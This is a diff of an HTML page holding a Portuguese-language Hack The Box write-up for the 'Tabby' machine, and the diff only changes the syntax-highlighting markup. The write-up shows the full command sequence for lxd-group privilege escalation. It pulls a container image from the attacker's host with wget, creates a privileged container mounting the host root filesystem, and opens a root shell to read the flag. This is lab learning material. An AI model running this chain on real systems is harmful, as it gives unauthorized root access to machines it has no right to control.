+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ sudo -l
+</span></span><span style="display:flex;"><span>    sudo: unable to open /run/sudo/ts/ash: Read-only file system
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> ash: 
+</span></span><span style="display:flex;"><span>     Sorry, user ash may not run sudo on tabby.
 </span></span></code></pre></div><p>Para o root está sendo mais dificil</p>
 <p>encontrei este cara</p>
 <p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation</a></p>
 <p><a href="https://github.com/lxc/distrobuilder">https://github.com/lxc/distrobuilder</a></p>
 <p>ele monta um container, dentro da pasta que vc quiser e estipular no seu S.O e escala o privilégio montando um container dentro da maquina alvo, vou testar</p>
 <p>basta seguir os passos certinho dessa doc ai que monta o container. Abre uma outra aba no terminal e deixa escutando o httpServer para transferir os arquivos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  ┌─<span class="o">[</span>root@liquid<span class="o">]</span>─<span class="o">[</span>~/Desktop/HTB/tabby/lxd-alpine-builder<span class="o">]</span>
-</span></span><span class="line"><span class="cl">    └──╼ <span class="c1">#ls -l</span>
-</span></span><span class="line"><span class="cl">    total <span class="m">3180</span>
-</span></span><span class="line"><span class="cl">    -rw-r--r-- <span class="m">1</span> root root <span class="m">3212312</span> Jun <span class="m">21</span> 22:04 alpine-v3.12-x86_64-20200621_2204.tar.gz
-</span></span><span class="line"><span class="cl">    -rwxr-xr-x <span class="m">1</span> root root    <span class="m">7498</span> Jun <span class="m">21</span> 22:03 build-alpine
-</span></span><span class="line"><span class="cl">    -rw-r--r-- <span class="m">1</span> root root   <span class="m">26530</span> Jun <span class="m">21</span> 22:03 LICENSE
-</span></span><span class="line"><span class="cl">    -rw-r--r-- <span class="m">1</span> root root     <span class="m">768</span> Jun <span class="m">21</span> 22:03 README.md
-</span></span><span class="line"><span class="cl">    ┌─<span class="o">[</span>✗<span class="o">]</span>─<span class="o">[</span>root@liquid<span class="o">]</span>─<span class="o">[</span>~/Desktop/HTB/tabby/lxd-alpine-builder<span class="o">]</span>
-</span></span><span class="line"><span class="cl">    └──╼ <span class="c1">#python -m SimpleHTTPServer </span>
-</span></span><span class="line"><span class="cl">    Serving HTTP on 0.0.0.0 port <span class="m">8000</span> ...
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">&lt; /pre&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ wget http://10.10.14.29:8000/rootfs.squashfs
-</span></span><span class="line"><span class="cl">ash@tabby:~$ wget http://10.10.14.29:8000/lxd.tar.gz
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">O meu lxd.tar.gz ele veio com lxd.tar.xz
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Eu dei um <span class="s1">&#39;mv&#39;</span> e renomeei ele para <span class="s1">&#39;gz&#39;</span>, fiz com xz e deu erro.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  ┌─<span style="color:#f92672">[</span>root@liquid<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/HTB/tabby/lxd-alpine-builder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    └──╼ <span style="color:#75715e">#ls -l</span>
+</span></span><span style="display:flex;"><span>    total <span style="color:#ae81ff">3180</span>
+</span></span><span style="display:flex;"><span>    -rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3212312</span> Jun <span style="color:#ae81ff">21</span> 22:04 alpine-v3.12-x86_64-20200621_2204.tar.gz
+</span></span><span style="display:flex;"><span>    -rwxr-xr-x <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">7498</span> Jun <span style="color:#ae81ff">21</span> 22:03 build-alpine
+</span></span><span style="display:flex;"><span>    -rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">26530</span> Jun <span style="color:#ae81ff">21</span> 22:03 LICENSE
+</span></span><span style="display:flex;"><span>    -rw-r--r-- <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">768</span> Jun <span style="color:#ae81ff">21</span> 22:03 README.md
+</span></span><span style="display:flex;"><span>    ┌─<span style="color:#f92672">[</span>✗<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>root@liquid<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/HTB/tabby/lxd-alpine-builder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    └──╼ <span style="color:#75715e">#python -m SimpleHTTPServer </span>
+</span></span><span style="display:flex;"><span>    Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt; /pre&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ wget http://10.10.14.29:8000/rootfs.squashfs
+</span></span><span style="display:flex;"><span>ash@tabby:~$ wget http://10.10.14.29:8000/lxd.tar.gz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>O meu lxd.tar.gz ele veio com lxd.tar.xz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Eu dei um <span style="color:#e6db74">&#39;mv&#39;</span> e renomeei ele para <span style="color:#e6db74">&#39;gz&#39;</span>, fiz com xz e deu erro.
 </span></span></code></pre></div><p>Passei os arquivos da maquina para dentro da maquiina tabby, ele me gerou esses dois arquivos no caso</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lxd.tar.xz e rootfs.squashfs
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lxd.tar.xz e rootfs.squashfs
 </span></span></code></pre></div><p>Depois</p>
 <p>na maquina tabby</p>
 <p>fiz o import desse container</p>
 <p>A maquina já contém o lxc instalado</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ lxc image import ./lxd.tar.gz rootfs.squashfs --alias alpine
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ lxc image import ./lxd.tar.gz rootfs.squashfs --alias alpine
 </span></span></code></pre></div><p>rootfs.squashfs = esse arquivo que vai proporcionar o root na maquina é maneiro essa montagem de container.</p>
 <p>Com o comando <code>lxc image list</code>  vc consegue ver todos os containers montados, no caso só o seu</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ lxc image list
-</span></span><span class="line"><span class="cl">lxc image list
-</span></span><span class="line"><span class="cl">+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ALIAS  <span class="p">|</span> FINGERPRINT  <span class="p">|</span> PUBLIC <span class="p">|</span> DESCRIPTION  <span class="p">|</span> ARCHITECTURE <span class="p">|</span>   TYPE    <span class="p">|</span>  SIZE   <span class="p">|</span>          UPLOAD DATE          <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> alpine <span class="p">|</span> a5f784005c68 <span class="p">|</span> no     <span class="p">|</span> Ubuntu focal <span class="p">|</span> x86_64       <span class="p">|</span> CONTAINER <span class="p">|</span> 97.74MB <span class="p">|</span> Jul 10, <span class="m">2020</span> at 10:50pm <span class="o">(</span>UTC<span class="o">)</span> <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ lxc image list
+</span></span><span style="display:flex;"><span>lxc image list
+</span></span><span style="display:flex;"><span>+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
+</span></span><span style="display:flex;"><span>| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION  | ARCHITECTURE |   TYPE    |  SIZE   |          UPLOAD DATE          |
+</span></span><span style="display:flex;"><span>+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
+</span></span><span style="display:flex;"><span>| alpine | a5f784005c68 | no     | Ubuntu focal | x86_64       | CONTAINER | 97.74MB | Jul 10, <span style="color:#ae81ff">2020</span> at 10:50pm <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>+--------+--------------+--------+--------------+--------------+-----------+---------+-------------------------------+
 </span></span></code></pre></div><p>fui seguindo o tutorial do  LXC  no link lá em cima.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lxd init
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lxd init
 </span></span></code></pre></div><p>Esse comando vai começar a montar o container, ele vai fazer uma serie de perguntas, vai deixando tudo como &lsquo;default&rsquo;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    ash@tabby:~$ lxd init
-</span></span><span class="line"><span class="cl">    Would you like to use LXD clustering? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: no
-</span></span><span class="line"><span class="cl">    Do you want to configure a new storage pool? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span>: no
-</span></span><span class="line"><span class="cl">    Would you like to connect to a MAAS server? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: ^C
-</span></span><span class="line"><span class="cl">    ash@tabby:~$ lxd init
-</span></span><span class="line"><span class="cl">    Would you like to use LXD clustering? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: no
-</span></span><span class="line"><span class="cl">    Do you want to configure a new storage pool? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span>: yes
-</span></span><span class="line"><span class="cl">    Name of the new storage pool <span class="o">[</span><span class="nv">default</span><span class="o">=</span>default<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    Name of the storage backend to use <span class="o">(</span>dir, lvm, ceph, btrfs<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>btrfs<span class="o">]</span>: dir
-</span></span><span class="line"><span class="cl">    Would you like to connect to a MAAS server? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: no
-</span></span><span class="line"><span class="cl">    Would you like to create a new <span class="nb">local</span> network bridge? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    What should the new bridge be called? <span class="o">[</span><span class="nv">default</span><span class="o">=</span>lxdbr0<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    The requested network bridge <span class="s2">&#34;lxdbr0&#34;</span> already exists. Please choose another name.
-</span></span><span class="line"><span class="cl">    What should the new bridge be called? <span class="o">[</span><span class="nv">default</span><span class="o">=</span>lxdbr0<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    The requested network bridge <span class="s2">&#34;lxdbr0&#34;</span> already exists. Please choose another name.
-</span></span><span class="line"><span class="cl">    What should the new bridge be called? <span class="o">[</span><span class="nv">default</span><span class="o">=</span>lxdbr0<span class="o">]</span>: liquid
-</span></span><span class="line"><span class="cl">    What IPv4 address should be used? <span class="o">(</span>CIDR subnet notation, “auto” or “none”<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    What IPv6 address should be used? <span class="o">(</span>CIDR subnet notation, “auto” or “none”<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    Would you like LXD to be available over the network? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: 
-</span></span><span class="line"><span class="cl">    Would you like stale cached images to be updated automatically? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>yes<span class="o">]</span> 
-</span></span><span class="line"><span class="cl">    Would you like a YAML <span class="s2">&#34;lxd init&#34;</span> preseed to be printed? <span class="o">(</span>yes/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no<span class="o">]</span>: 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    ash@tabby:~$ lxd init
+</span></span><span style="display:flex;"><span>    Would you like to use LXD clustering? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>no<span style="color:#f92672">]</span>: no
+</span></span><span style="display:flex;"><span>    Do you want to configure a new storage pool? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>yes<span style="color:#f92672">]</span>: no
+</span></span><span style="display:flex;"><span>    Would you like to connect to a MAAS server? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>no<span style="color:#f92672">]</span>: ^C
+</span></span><span style="display:flex;"><span>    ash@tabby:~$ lxd init
+</span></span><span style="display:flex;"><span>    Would you like to use LXD clustering? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>no<span style="color:#f92672">]</span>: no
+</span></span><span style="display:flex;"><span>    Do you want to configure a new storage pool? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>yes<span style="color:#f92672">]</span>: yes
+</span></span><span style="display:flex;"><span>    Name of the new storage pool <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>default<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    Name of the storage backend to use <span style="color:#f92672">(</span>dir, lvm, ceph, btrfs<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>btrfs<span style="color:#f92672">]</span>: dir
+</span></span><span style="display:flex;"><span>    Would you like to connect to a MAAS server? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>no<span style="color:#f92672">]</span>: no
+</span></span><span style="display:flex;"><span>    Would you like to create a new local network bridge? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>yes<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    What should the new bridge be called? <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>lxdbr0<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    The requested network bridge <span style="color:#e6db74">&#34;lxdbr0&#34;</span> already exists. Please choose another name.
+</span></span><span style="display:flex;"><span>    What should the new bridge be called? <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>lxdbr0<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    The requested network bridge <span style="color:#e6db74">&#34;lxdbr0&#34;</span> already exists. Please choose another name.
+</span></span><span style="display:flex;"><span>    What should the new bridge be called? <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>lxdbr0<span style="color:#f92672">]</span>: liquid
+</span></span><span style="display:flex;"><span>    What IPv4 address should be used? <span style="color:#f92672">(</span>CIDR subnet notation, “auto” or “none”<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>auto<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    What IPv6 address should be used? <span style="color:#f92672">(</span>CIDR subnet notation, “auto” or “none”<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>auto<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    Would you like LXD to be available over the network? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>no<span style="color:#f92672">]</span>: 
+</span></span><span style="display:flex;"><span>    Would you like stale cached images to be updated automatically? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>yes<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>    Would you like a YAML <span style="color:#e6db74">&#34;lxd init&#34;</span> preseed to be printed? <span style="color:#f92672">(</span>yes/no<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>default<span style="color:#f92672">=</span>no<span style="color:#f92672">]</span>: 
 </span></span></code></pre></div><p>Depois que montei, usei o comando abaixo para iniciar ele.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ lxc init alpine privesc -c security.privileged<span class="o">=</span><span class="nb">true</span>
-</span></span><span class="line"><span class="cl">lxc init alpine privesc -c security.privileged<span class="o">=</span><span class="nb">true</span>
-</span></span><span class="line"><span class="cl">Creating privesc
-</span></span><span class="line"><span class="cl">ash@tabby:~$ lxc list
-</span></span><span class="line"><span class="cl">lxc list
-</span></span><span class="line"><span class="cl">+---------+---------+------+------+-----------+-----------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span>  NAME   <span class="p">|</span>  STATE  <span class="p">|</span> IPV4 <span class="p">|</span> IPV6 <span class="p">|</span>   TYPE    <span class="p">|</span> SNAPSHOTS <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+---------+---------+------+------+-----------+-----------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> privesc <span class="p">|</span> STOPPED <span class="p">|</span>      <span class="p">|</span>      <span class="p">|</span> CONTAINER <span class="p">|</span> <span class="m">0</span>         <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+---------+---------+------+------+-----------+-----------+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ lxc init alpine privesc -c security.privileged<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>lxc init alpine privesc -c security.privileged<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>Creating privesc
+</span></span><span style="display:flex;"><span>ash@tabby:~$ lxc list
+</span></span><span style="display:flex;"><span>lxc list
+</span></span><span style="display:flex;"><span>+---------+---------+------+------+-----------+-----------+
+</span></span><span style="display:flex;"><span>|  NAME   |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+</span></span><span style="display:flex;"><span>+---------+---------+------+------+-----------+-----------+
+</span></span><span style="display:flex;"><span>| privesc | STOPPED |      |      | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+---------+---------+------+------+-----------+-----------+
 </span></span></code></pre></div><p>Ele foi criaado, porém está stopado.  Fala na documentação que precisa configurar ele no mnt
 ai eu fiz isso dessa forma:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lxc config device add privesc mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lxc config device add privesc mydevice disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root recursive<span style="color:#f92672">=</span>true
 </span></span></code></pre></div><p>(consta na documentação também)
 ele sempre cria o container com o nome &lsquo;privesc&rsquo;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    ash@tabby:~$ lxc config device add privesc mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
-</span></span><span class="line"><span class="cl">    Device mydevice added to privesc
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    ash@tabby:~$ lxc config device add privesc mydevice disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root recursive<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>    Device mydevice added to privesc
 </span></span></code></pre></div><p>Ele foi montado com sucesso, agora só dar o start no container.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ lxc start privesc
-</span></span><span class="line"><span class="cl">lxc start privesc
-</span></span><span class="line"><span class="cl">ash@tabby:~$ lxc <span class="nb">exec</span> privesc /bin/sh
-</span></span><span class="line"><span class="cl">lxc <span class="nb">exec</span> privesc /bin/sh
-</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># cd /mnt/root</span>
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /mnt/root
-</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">bin    dev   lib    libx32    mnt   root  snap      sys  var
-</span></span><span class="line"><span class="cl">boot   etc   lib32  lost+found    opt   run   srv       tmp
-</span></span><span class="line"><span class="cl">cdrom  home  lib64  media    proc  sbin  swap.img  usr
-</span></span><span class="line"><span class="cl"><span class="c1"># cd root</span>
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> root
-</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">root.txt  snap
-</span></span><span class="line"><span class="cl"><span class="c1"># cat root.txt    </span>
-</span></span><span class="line"><span class="cl">cat root.txt
-</span></span><span class="line"><span class="cl">653d95c2eb0f63629eeb048ea1d0a3b5
-</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ lxc start privesc
+</span></span><span style="display:flex;"><span>lxc start privesc
+</span></span><span style="display:flex;"><span>ash@tabby:~$ lxc exec privesc /bin/sh
+</span></span><span style="display:flex;"><span>lxc exec privesc /bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd /mnt/root</span>
+</span></span><span style="display:flex;"><span>cd /mnt/root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>bin    dev   lib    libx32    mnt   root  snap      sys  var
+</span></span><span style="display:flex;"><span>boot   etc   lib32  lost+found    opt   run   srv       tmp
+</span></span><span style="display:flex;"><span>cdrom  home  lib64  media    proc  sbin  swap.img  usr
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd root</span>
+</span></span><span style="display:flex;"><span>cd root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>root.txt  snap
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cat root.txt    </span>
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>653d95c2eb0f63629eeb048ea1d0a3b5
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
 </span></span></code></pre></div>
 </main>
     <footer>
